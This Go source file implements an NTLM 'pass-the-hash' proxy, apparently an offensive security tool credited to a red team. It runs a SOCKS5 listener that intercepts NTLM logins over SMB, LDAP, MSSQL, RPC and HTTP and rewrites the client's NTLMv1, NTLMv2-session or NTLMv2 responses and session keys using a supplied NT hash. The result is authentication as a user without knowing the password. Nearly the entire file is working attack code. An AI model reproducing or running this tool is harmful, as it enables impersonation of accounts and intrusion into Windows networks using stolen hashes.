package main

import (
	"flag"
	"fmt"
	"io"
	"net"
	"bytes"
	"crypto/des"
	"./golang.org/x/crypto/md4"
	"crypto/md5"
	"crypto/hmac"
	"encoding/binary"
	"strconv"
	"unicode/utf16"
	"strings"
	"crypto/rc4"
	"encoding/base64"
)

const (
	NTLMv1 = 0x01
	NTLMv2_Session = 0x02
	NTLMv2 = 0x03

	Encode_None = 0x01
	Encode_Base64 = 0x02

	NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY = 0x00080000
	NTLMSSP_REQUEST_NON_NT_SESSION_KEY = 0x00400000
	NTLMSSP_NEGOTIATE_LM_KEY = 0x00000080
)

var (
	bad_pass_bytes []byte
	client_base_session_key []byte
	pass_bytes []byte
	ChallengeChan chan []byte
)

func fromUnicode(d []byte)string {
	if len(d)%2 > 0 {
		return ""
	}
	s := make([]uint16, len(d)/2)
	err := binary.Read(bytes.NewReader(d), binary.LittleEndian, &s)
	if err != nil {
		return ""
	}
	return string(utf16.Decode(s))
}

func toUnicode(s string) []byte {
	uints := utf16.Encode([]rune(s))
	b := bytes.Buffer{}
	binary.Write(&b, binary.LittleEndian, &uints)
	return b.Bytes()
}

func NT_OWFv2(ntlm_hash, username, domain []byte) []byte {
	return hmacMd5(ntlm_hash, toUnicode(strings.ToUpper(fromUnicode(username))), domain)
}

func calcNtlmv2_NTProofStr(ntlmV2Hash, serverChallenge, timestamp, clientChallenge, targetInfo []byte) []byte {
	temp := []byte{1, 1, 0, 0, 0, 0, 0, 0}
	temp = append(temp, timestamp...)
	temp = append(temp, clientChallenge...)
	temp = append(temp, 0, 0, 0, 0)
	temp = append(temp, targetInfo...)
	return hmacMd5(ntlmV2Hash, serverChallenge, temp)
}

func hmacMd5(key []byte, data ...[]byte) []byte {
	mac := hmac.New(md5.New, key)
	for _, d := range data {
		mac.Write(d)
	}
	return mac.Sum(nil)
}

func md4_of(data []byte) []byte{
	ctx := md4.New()
	ctx.Write(data)
	return ctx.Sum(nil)
}

func calcNTLMv1(challenge []byte, pass []byte) []byte {
	hash := make([]byte, 21)
	res := make([]byte, 24)
	copy(hash,pass)

	blk, _ := des.NewCipher(convDes7to8(hash[0:7]))
	blk.Encrypt(res[0:8], challenge)

	blk, _ = des.NewCipher(convDes7to8(hash[7:14]))
	blk.Encrypt(res[8:16], challenge)

	blk, _ = des.NewCipher(convDes7to8(hash[14:21]))
	blk.Encrypt(res[16:24], challenge)

	return res
}

// ConvDes7to8 adds parity bit after every 7th bit.
func convDes7to8(src []byte) []byte {
	res := make([]byte, 8)

	res[0] = src[0] & 0xFE
	res[1] = (src[0]<<7)&0xFF | (src[1]>>1)&0xFE
	res[2] = (src[1]<<6)&0xFF | (src[2]>>2)&0xFE
	res[3] = (src[2]<<5)&0xFF | (src[3]>>3)&0xFE
	res[4] = (src[3]<<4)&0xFF | (src[4]>>4)&0xFE
	res[5] = (src[4]<<3)&0xFF | (src[5]>>5)&0xFE
	res[6] = (src[5]<<2)&0xFF | (src[6]>>6)&0xFE
	res[7] = (src[6] << 1) & 0xFF

	for i := range res {
		if ((res[i]>>7 ^ res[i]>>6 ^ res[i]>>5 ^ res[i]>>4 ^ res[i]>>3 ^ res[i]>>2 ^ res[i]>>1) & 0x01) == 0 {
			res[i] |= 0x01
		}
	}

	return res
}

type Ntlm_req_auth struct {
	Protocol string
	Ntlmssp_location int
	Req_data []byte
	Ntlm_Type int
	Encode_Type int
	Client_Challenge [8]byte
	
	Lm_offset int
	Ntlm_response_24 [24]byte
	Ntlm_offset int
	Session_key_offset int
	Session_key [16]byte
	//Ntlm_v2_response []byte
	Domain []byte
	User []byte
	Host []byte
	NTProofStr [16]byte
	Timestamp [8]byte
	Target_info []byte


}

type handle struct {
	Data *bytes.Buffer
}

func identification_protocol(h *handle) string{
	var protocol string
	if bytes.Compare(h.Data.Bytes()[4:8], []byte("\xffSMB")) == 0{
		protocol = "SMB"
	}else if bytes.Compare(h.Data.Bytes()[4:8], []byte("\xfeSMB")) == 0{
		protocol = "SMB2"
	}else if bytes.Compare(h.Data.Bytes()[0:2], []byte("\x05\x00")) == 0{
		protocol = "DEC/RPC 5"
	}else if bytes.Compare(h.Data.Bytes()[0:4], []byte("\x30\x84\x00\x00")) == 0{
		protocol = "LDAP"
	}else if ( (bytes.Compare(h.Data.Bytes()[0:1], []byte("\x04")) == 0) && (bytes.Compare(h.Data.Bytes()[11:23], []byte("NTLMSSP\x00\x02\x00\x00\x00")) == 0) ){
		protocol = "MSSQL"
	}else if ( (bytes.Compare(h.Data.Bytes()[0:1], []byte("\x11")) == 0) && (bytes.Compare(h.Data.Bytes()[8:20], []byte("NTLMSSP\x00\x03\x00\x00\x00")) == 0) ){
		protocol = "MSSQL"
	}else if ( (bytes.Compare(h.Data.Bytes()[0:4], []byte("GET ")) == 0) || (bytes.Compare(h.Data.Bytes()[0:5], []byte("POST ")) == 0) || (bytes.Compare(h.Data.Bytes()[0:4], []byte("HTTP")) == 0) ){
		if bytes.Index(h.Data.Bytes(), []byte("\nAuthorization: NTLM TlRMTVNTUA")) != -1 || bytes.Index(h.Data.Bytes(), []byte("\nWWW-Authenticate: NTLM TlRMTVNTUA")) != -1 || bytes.Index(h.Data.Bytes(), []byte("\nAuthorization: Negotiate TlRMTVNTUA")) != -1 || bytes.Index(h.Data.Bytes(), []byte("\nWWW-Authenticate: Negotiate TlRMTVNTUA")) != -1{
			protocol = "HTTP"
		}
	}
	//fmt.Println(protocol)
	return protocol
}

func ntlm_get_challenge(h *handle) []byte{
	if h.Data == nil{
		return nil
	}
	protocol := identification_protocol(h)
	if protocol == ""{
		return nil
	}
	data := make([]byte, 32, 32)
	if protocol == "HTTP"{
		str_ntlm_challenge := []byte("\nWWW-Authenticate: NTLM ")
		location := bytes.Index(h.Data.Bytes(), str_ntlm_challenge)
		if location == -1{
			str_ntlm_challenge = []byte("\nWWW-Authenticate: Negotiate ")
			location = bytes.Index(h.Data.Bytes(), str_ntlm_challenge)
			if location == -1{
				return nil
			}
		}
		var tmp []byte
		
		for i:=location + len(str_ntlm_challenge);i>0;i++{
			if bytes.Compare(h.Data.Bytes()[i:i+1], []byte("\r")) == 0{
				break
			}
			tmp = append(tmp, h.Data.Bytes()[i])
		}
		decodeBytes, err := base64.StdEncoding.DecodeString(string(tmp))
		if err != nil{
			return nil
		}
		copy(data, decodeBytes)
	}else{
		str_ntlm_challenge := []byte("NTLMSSP\x00\x02\x00\x00\x00")
		location := bytes.Index(h.Data.Bytes(), str_ntlm_challenge)
		if location == -1{
			return nil
		}
		copy(data, h.Data.Bytes()[location:])
	}
	return data[24:32]
}

func location_ntlm_req(h *handle) Ntlm_req_auth{
	req := Ntlm_req_auth{}
	if h.Data == nil {
		return req
	} 
	protocol := identification_protocol(h)
	if protocol == ""{
		return req
	}
	if protocol == "HTTP"{
		str_ntlm_auth := []byte("\nAuthorization: NTLM ")
		req.Ntlmssp_location = bytes.Index(h.Data.Bytes(), str_ntlm_auth)
		if req.Ntlmssp_location == -1{
			str_ntlm_auth = []byte("\nAuthorization: Negotiate ")
			req.Ntlmssp_location = bytes.Index(h.Data.Bytes(), str_ntlm_auth)
			if req.Ntlmssp_location == -1{
				return req
			}
		}
		req.Ntlmssp_location += len(str_ntlm_auth)
		var tmp []byte
		for i:=req.Ntlmssp_location;i>0;i++{
			if bytes.Compare(h.Data.Bytes()[i:i+1], []byte("\r")) == 0{
				break
			}
			tmp = append(tmp, h.Data.Bytes()[i])
		}
		decodeBytes, err := base64.StdEncoding.DecodeString(string(tmp))
		if err != nil{
			return req
		}
		req.Req_data = make([]byte, len(decodeBytes))
		copy(req.Req_data[:], decodeBytes)
		req.Encode_Type = Encode_Base64
	}else{
		str_ntlm_auth := []byte("NTLMSSP\x00\x03\x00\x00\x00")
		req.Ntlmssp_location = bytes.Index(h.Data.Bytes(), str_ntlm_auth)// == 63
		if req.Ntlmssp_location == -1{
			return req
		}
		req.Req_data = make([]byte, len(h.Data.Bytes())-req.Ntlmssp_location)
		copy(req.Req_data[:], h.Data.Bytes()[req.Ntlmssp_location:])
		req.Encode_Type = Encode_None
	}
	req.Protocol = protocol
	return req
}

func ntlm_get_authinfo(h *handle) Ntlm_req_auth{
	req := location_ntlm_req(h)
	if req.Protocol != ""{
		negotiate_flags := binary.LittleEndian.Uint32(req.Req_data[60:64])
		req.Lm_offset = int(binary.LittleEndian.Uint32(req.Req_data[16:20]))
		req.Ntlm_offset = int(binary.LittleEndian.Uint32(req.Req_data[24:28]))
		domain_name_length := int(binary.LittleEndian.Uint16(req.Req_data[28:30]))
		domain_name_offset := int(binary.LittleEndian.Uint32(req.Req_data[32:36]))
		req.Domain = make([]byte, domain_name_length)
		copy(req.Domain[:], req.Req_data[domain_name_offset:domain_name_offset + domain_name_length])

		user_name_length := int(binary.LittleEndian.Uint16(req.Req_data[36:38]))
		user_name_offset := int(binary.LittleEndian.Uint32(req.Req_data[40:44]))
		req.User = make([]byte, user_name_length)
		copy(req.User[:], req.Req_data[user_name_offset:user_name_offset + user_name_length])

		host_name_length := int(binary.LittleEndian.Uint16(req.Req_data[44:46]))
		host_name_offset := int(binary.LittleEndian.Uint32(req.Req_data[48:52]))
		req.Host = make([]byte, host_name_length)
		copy(req.Host[:], req.Req_data[host_name_offset:host_name_offset + host_name_length])
		
		session_key_length := int(binary.LittleEndian.Uint16(req.Req_data[52:54]))
		if session_key_length == 16{
			req.Session_key_offset = int(binary.LittleEndian.Uint32(req.Req_data[56:60]))
			copy(req.Session_key[:], req.Req_data[req.Session_key_offset:req.Session_key_offset + 16])
		}
		
		NTLM_response_length := binary.LittleEndian.Uint16(req.Req_data[20:22])
		if NTLM_response_length != 24{
			req.Ntlm_Type = NTLMv2
			copy(req.NTProofStr[:], req.Req_data[req.Ntlm_offset:req.Ntlm_offset + 16])
			copy(req.Timestamp[:], req.Req_data[req.Ntlm_offset + 24:req.Ntlm_offset + 32])
			copy(req.Client_Challenge[:], req.Req_data[req.Ntlm_offset + 32:req.Ntlm_offset + 40])
			target_info_length := int(binary.LittleEndian.Uint16(req.Req_data[20 :22])) - 44
			if target_info_length < 0{
				req.Protocol = ""
				return req
			}
			req.Target_info = make([]byte, target_info_length)
			copy(req.Target_info[:], req.Req_data[req.Ntlm_offset + 44:req.Ntlm_offset + 44 + target_info_length])
		}else if (negotiate_flags >> 19)&1 == 1{ // .... .... .... 1... .... .... .... .... = Negotiate Extended Security: Set 当这个标志被设置的时候，客户端不会使用NTLMv1
			req.Ntlm_Type = NTLMv2_Session
			copy(req.Client_Challenge[:], req.Req_data[req.Lm_offset:req.Lm_offset + 8])
			copy(req.Ntlm_response_24[:], req.Req_data[req.Ntlm_offset:req.Ntlm_offset + 24])
		}else{
			req.Ntlm_Type = NTLMv1
			copy(req.Ntlm_response_24[:], req.Req_data[req.Ntlm_offset:req.Ntlm_offset + 24])
		}
		return req
	}
	return req
}

func ntlm_replace(h *handle, req Ntlm_req_auth){
	if req.Ntlm_Type == NTLMv2{
		copy(req.Req_data[req.Ntlm_offset:req.Ntlm_offset + 16], req.NTProofStr[:])
	}else {
		copy(req.Req_data[req.Ntlm_offset:req.Ntlm_offset + 24], req.Ntlm_response_24[:])
	}
	if req.Session_key_offset == 0{
		/*
		如果NTLM认证请求里没有交换会话KEY，就不替换了。 
		那么按照http://davenport.sourceforge.net/ntlm.html的说法，服务端和客户端就会使用从LM/NT Hash计算而来的Key，那么两边Key不同，验证失败。
		但是一般有用到签名的，都会产生一个会话KEY然后交换，所以我就偷下懒，等遇到有服务端不交换临时会话KEY的时候，再想办法。

		还有就是只实现了NTLMv1 NTLM2 Session NTLMv2的会话Key计算，没有通过Flag值来判断实际使用的会话Key算法（LMv1,LMv2,LM）
		*/
	}else{
		random_key := make([]byte, 16)
		session_key := make([]byte, 16)

		

		fmt.Printf("[*]Client Base Session Key : %X\n", client_base_session_key)
		fmt.Printf("[*]Right Base Session Key : %X\n", req.Session_key)


		old_cipher, _ := rc4.NewCipher(client_base_session_key[:])
		old_cipher.XORKeyStream(random_key, req.Req_data[req.Session_key_offset:req.Session_key_offset + 16])
		fmt.Printf("[*]Random Key : %X\n", random_key)
		new_cipher, _ := rc4.NewCipher(req.Session_key[:])
		new_cipher.XORKeyStream(session_key, random_key)
		fmt.Printf("[*]Session Key Replaced : %X => %X\n", req.Req_data[req.Session_key_offset:req.Session_key_offset + 16], session_key)
		//copy(req.Req_data[req.Session_key_offset:req.Session_key_offset + 16], session_key[:])
	}

	var flow_raw_data []byte
	if req.Encode_Type == Encode_Base64{
		flow_raw_data = append(flow_raw_data, base64.StdEncoding.EncodeToString(req.Req_data)...)
	}else if req.Encode_Type == Encode_None{
		flow_raw_data = append(flow_raw_data, req.Req_data...)
	}
	copy(h.Data.Bytes()[req.Ntlmssp_location:], flow_raw_data)
	fmt.Println()
}

func (h *handle) Write(p []byte) (n int, err error){
	h.Data = bytes.NewBuffer(p)
	return len(p),io.EOF
}

func (h *handle) Read(p []byte) (n int, err error){
	if h.Data != nil{
		copy(p, h.Data.Bytes())
		return len(h.Data.Bytes()),io.EOF
	}
	return 0,nil
}

func handleClientRequest(client net.Conn) {
    if client == nil {
        return
    }
    defer client.Close()

    var b [1024]byte
    n, err := client.Read(b[:])
    if err != nil {
        fmt.Println(err)
        return
    }

    if b[0] == 0x05 { //只处理Socks5协议
        //客户端回应：Socks服务端不需要验证方式
        client.Write([]byte{0x05, 0x00})
        n, err = client.Read(b[:])
        var host string
        switch b[3] {
        case 0x01: //IP V4
            host = net.IPv4(b[4], b[5], b[6], b[7]).String()
        case 0x03: //域名
            host = string(b[5 : n-2]) //b[4]表示域名的长度
        case 0x04: //IP V6
            host = net.IP{b[4], b[5], b[6], b[7], b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15], b[16], b[17], b[18], b[19]}.String()
        }
        port := strconv.Itoa(int(b[n-2])<<8 | int(b[n-1]))
        target_ip := net.JoinHostPort(host, port)


        defer client.Close()
		server, err := net.Dial("tcp", target_ip)
		if err != nil {
			fmt.Print(err)
			return
		}
		defer server.Close()
        client.Write([]byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}) //响应客户端连接成功
        //进行转发
		ExitChan := make(chan string, 1)
		go func(client net.Conn, server net.Conn, Exit chan string) {
			fmt.Printf("%s <=> %s <=> %s\n", client.RemoteAddr(), client.LocalAddr(), server.RemoteAddr())
	        h := new(handle)
	        for{
				_, err = io.Copy(h, client)
				if err == nil || err != io.EOF{
					break
				}
				select{
					case Challenge := (<-ChallengeChan):
						req := ntlm_get_authinfo(h)
						if req.Protocol != ""{
							fmt.Printf("[+]NTLM Over %s :\n", req.Protocol)
							fmt.Printf("\t[*]Server Challenge : %X\n", Challenge)
							fmt.Printf("\t[+]Request Info :\n")
							fmt.Printf("\t\t[*]Username : %v\n", fromUnicode(req.User))
							fmt.Printf("\t\t[*]Domain : %v\n", fromUnicode(req.Domain))
							fmt.Printf("\t\t[*]Hostname : %v\n", fromUnicode(req.Host))
							if req.Ntlm_Type == NTLMv1{
								fmt.Printf("\t[*]NTLM Response Type : NTLMv1\n")
								ntlm_v1_hash := calcNTLMv1(Challenge, pass_bytes[:])
								fmt.Printf("\t[*]NTLMv1 Replaced : %X => %X\n", req.Ntlm_response_24, ntlm_v1_hash)
								copy(req.Ntlm_response_24[:], ntlm_v1_hash)
								
								session_key_v1 := md4_of(pass_bytes[:])
								client_base_session_key = md4_of(bad_pass_bytes[:])
								copy(req.Session_key[:], session_key_v1)
							}else if req.Ntlm_Type == NTLMv2_Session{
								fmt.Printf("\t[*]NTLM Response Type : NTLMv2 Session\n")
								fmt.Printf("\t[*]Client Challenge : %X\n", req.Client_Challenge)
								md5Ctx := md5.New()
								md5Ctx.Write(Challenge)
								md5Ctx.Write(req.Client_Challenge[:])
								Real_Challenge := md5Ctx.Sum(nil)[:8]
								ntlm_v2_session_hash := calcNTLMv1(Real_Challenge, pass_bytes[:])
								fmt.Printf("\t[*]NTLMv2 Session Replaced : %X => %X\n", req.Ntlm_response_24[:], ntlm_v2_session_hash)
								copy(req.Ntlm_response_24[:], ntlm_v2_session_hash)
								
								session_key_v1 := md4_of(pass_bytes[:])
								client_session_key_v1 := md4_of(bad_pass_bytes[:])
								session_key_2 := hmacMd5(session_key_v1, Challenge, req.Client_Challenge[:])
								client_base_session_key = hmacMd5(client_session_key_v1, Challenge, req.Client_Challenge[:])
								copy(req.Session_key[:], session_key_2)
											
							}else if req.Ntlm_Type == NTLMv2{
								fmt.Printf("\t[*]NTLM Response Type : NTLMv2\n")
								ntv2 := NT_OWFv2(pass_bytes[:], req.User, req.Domain)
								bad_ntv2 := NT_OWFv2(bad_pass_bytes[:], req.User, req.Domain)
								bad_NTProofStr := calcNtlmv2_NTProofStr(bad_ntv2, Challenge[:], req.Timestamp[:], req.Client_Challenge[:], req.Target_info)
								
								/*
								NTLMSSP字段里的Domain Name并不可信：
									Win2003不会把Domain Name拼接计算NTLMv2 Hash。
									先假设会拼接，然后计算出NTProofStr比对流量中的NTProofStr，如果不一致就不拼接域名，重新计算，确保计算出的客户端Base Session Key正确，以便解密得到客户端生成的临时会话Key。
								*/
								if bytes.Compare(bad_NTProofStr, req.NTProofStr[:]) != 0{
									bad_ntv2 = NT_OWFv2(bad_pass_bytes[:], req.User, []byte(""))
									client_base_session_key = hmacMd5(bad_ntv2, calcNtlmv2_NTProofStr(bad_ntv2, Challenge[:], req.Timestamp[:], req.Client_Challenge[:], req.Target_info))
								}else{
									client_base_session_key = hmacMd5(bad_ntv2, bad_NTProofStr)
								}

								//ntv2 := NT_OWFv2(pass_bytes[:], req.User, req.Domain)
								fmt.Printf("\t[*]NTLMv2 HASH : %X\n", ntv2)
								fmt.Printf("\t[*]Timestamp : %X\n", req.Timestamp)
								fmt.Printf("\t[*]Client Challenge : %X\n", req.Client_Challenge)
								fmt.Printf("\t[*]Target Info :\n")
								i:=0
								for {
									attribute_type := int(binary.LittleEndian.Uint16(req.Target_info[i:i + 2]))
									attribute_length := int(binary.LittleEndian.Uint16(req.Target_info[i + 2:i + 4]))
									if attribute_length == 0{
										break
									}
									attribute_data := make([]byte, attribute_length)
									copy(attribute_data, req.Target_info[i + 4:i + 4 + attribute_length])
									value := fromUnicode(attribute_data)
											
									i += 4 + attribute_length
									var key string
									switch attribute_type{
									case 1:
										key = "NetBIOS Computer"
										break
									case 2:
										key = "NetBIOS Domain"
										break
									case 3:
										key = "DNS Computer"
										break
									case 4:
										key = "DNS Domain"
										break
									case 5:
										key = "DNS Tree"
										break
									case 9:
										key = "Target Info"
										break
									default:
										key = fmt.Sprintf("Type 0x%X", attribute_type)
										value = fmt.Sprintf("%X", attribute_data)
									}
									fmt.Printf("\t\t[*]%v : %v\n", key, value)
								}
								
								
								
								NTProofStr := calcNtlmv2_NTProofStr(ntv2, Challenge[:], req.Timestamp[:], req.Client_Challenge[:], req.Target_info)
								session_key_v2 := hmacMd5(ntv2, NTProofStr)
								fmt.Printf("\t[*]NTProofStr: %X => %X\n", req.NTProofStr, NTProofStr)
								copy(req.NTProofStr[:], NTProofStr)
								copy(req.Session_key[:], session_key_v2)
							}
							ntlm_replace(h, req)	
						}else{
							ChallengeChan <- Challenge
						}
					default:
								
				}
				_, err = io.Copy(server, h)
			}
			if err == nil{
				err = fmt.Errorf("%s Close Socket", server.RemoteAddr())
			}
			ExitChan <- err.Error()
		}(client, server, ExitChan)

		go func(client net.Conn, server net.Conn, Exit chan string) {
			h := new(handle)
			var err error
			for {
				_, err = io.Copy(h, server)
				if err == nil || err != io.EOF{
					break
				}
				Challenge := ntlm_get_challenge(h)
				if Challenge != nil{
					//fmt.Printf("Got Challenge => %X\n", Challenge)
					ChallengeChan <- Challenge
				}
				_, err = io.Copy(client, h)
			}
			if err == nil{
				//fmt.Println(err)
				err = fmt.Errorf("%s Close Socket", server.RemoteAddr())
			}
			ExitChan <- err.Error()
		}(client, server, ExitChan)
		fmt.Println(<-ExitChan)
		fmt.Println()
    }

}

func Format_password(pass string) []byte {
	_pass_bytes := make([]byte, len(pass)/2)
	for i:=0;i<len(pass);i=i+2{
		chr := pass[i:i+2]
		ii, err := strconv.ParseInt(chr, 16, 32)
		if err != nil {
			panic("NT HASH Format Error")
		}
		_pass_bytes[i/2]=byte(ii)
	}
	return _pass_bytes
}

func main() {
	fmt.Println("NTLM PROXY // Code By Luan @ 360 A-Team")

	var ip,pass,bad_pass string

	flag.StringVar(&bad_pass, "b", "1234567", "-b 1234567 // BAD PASSWORD")
	flag.StringVar(&pass, "h", "32ed87bdb5fdc5e9cba88547376818d4", "-h 32ed87bdb5fdc5e9cba88547376818d4 // NT HASH")
	flag.StringVar(&ip, "p", ":1080", "-p 0.0.0.0:1080 // Proxy IP:Port")
	flag.Parse()

	pass_bytes = Format_password(pass)
	bad_pass_bytes = md4_of(toUnicode(bad_pass))
	fmt.Printf("[+]Bad NT HASH : %X\n", bad_pass_bytes)


	ChallengeChan = make(chan []byte, 8)

	lis, err := net.Listen("tcp", ip)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer lis.Close()
	for {
		conn, err := lis.Accept()
		if err != nil {
			fmt.Println("Socket Error : %v\n", err)
			continue
		}
		go handleClientRequest(conn)
	}
}
